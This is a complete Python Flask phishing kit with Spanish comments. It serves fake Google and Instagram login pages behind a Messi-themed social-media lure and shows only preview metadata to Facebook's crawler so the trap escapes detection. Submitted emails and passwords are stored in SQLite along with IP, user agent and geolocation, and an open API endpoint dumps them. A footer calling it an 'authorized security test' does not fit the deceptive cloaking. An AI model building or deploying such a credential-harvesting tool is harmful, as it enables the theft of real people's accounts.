#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect, jsonify
import sqlite3
import json
import requests
from datetime import datetime
import os

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            referer TEXT,
            geo_location TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_template():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            template_name = config.get('template', 'google')
    except:
        template_name = 'google'
    
    templates = {
        'google': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
    
    <!-- METADATOS COMPLETOS PARA REDES SOCIALES -->
    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
    <meta property="og:description" content="Me dijeron que ganaría" />
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:image:secure_url" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="https://video-xeen.onrender.com" />
    <meta property="og:type" content="video.other" />
    <meta property="og:site_name" content="Messi Declaraciones" />
    <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
    
    <!-- METADATOS TWITTER -->
    <meta name="twitter:card" content="player" />
    <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
    <meta name="twitter:description" content="Me dijeron que ganaría" />
    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta name="twitter:player" content="https://video-xeen.onrender.com" />
    <meta name="twitter:player:width" content="1280" />
    <meta name="twitter:player:height" content="720" />
    
    <!-- METADATOS PARA WHATSAPP -->
    <meta property="og:video:type" content="application/x-shockwave-flash" />
    
    <title>😲 Fuertes declaraciones de Messi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 450px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #5f6368; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
        .video-container { display: none; } /* Video oculto para engañar al scraper */
    </style>
</head>
<body>
    <!-- Contenido oculto para engañar a los scrapers -->
    <div style="display:none;" class="video-container">
        <video width="1280" height="720" controls>
            <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
        </video>
    </div>
    
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Iniciar sesión</h1>
        <p>Utiliza tu cuenta de Google</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Siguiente</button>
        </form>
        <div class="footer">Prueba de seguridad autorizada</div>
    </div>
</body>
</html>''',
        # ... resto de templates (microsoft, netflix, instagram)
        'instagram': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <!-- Mismos metadatos OG para Instagram -->
    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
    <meta property="og:description" content="Me dijeron que ganaría" />
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta property="og:url" content="https://video-xeen.onrender.com" />
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
        button:hover { background: #0081d6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>'''
    }
    
    return templates.get(template_name, templates['google'])

@app.route('/')
def index():
    # Verificar si es un bot de Facebook/Instagram
    user_agent = request.headers.get('User-Agent', '')
    
    if 'facebookexternalhit' in user_agent.lower() or 'facebot' in user_agent.lower():
        # Si es el bot de Facebook, mostrar solo los metadatos
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
            <meta property="og:description" content="Me dijeron que ganaría" />
            <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
            <meta property="og:url" content="https://video-xeen.onrender.com" />
            <meta property="og:type" content="video.other" />
        </head>
        <body></body>
        </html>
        ''')
    
    return render_template_string(get_template())

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
    except:
        location = "Unknown"
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': request.form.get('email') or request.form.get('username'),
        'password': request.form.get('password'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'geo_location': location
    }
    
    # Guardar en DB
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
          data['user_agent'], data['referer'], data['geo_location']))
    conn.commit()
    conn.close()
    
    return redirect("https://www.google.com")

@app.route('/api/credentials')
def api_credentials():
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

if __name__ == '__main__':
    init_db()
    print("[+] Servidor iniciado en http://localhost:8080")
    print("[+] Presiona Ctrl+C para detener")
    app.run(host='0.0.0.0', port=8080, debug=False)
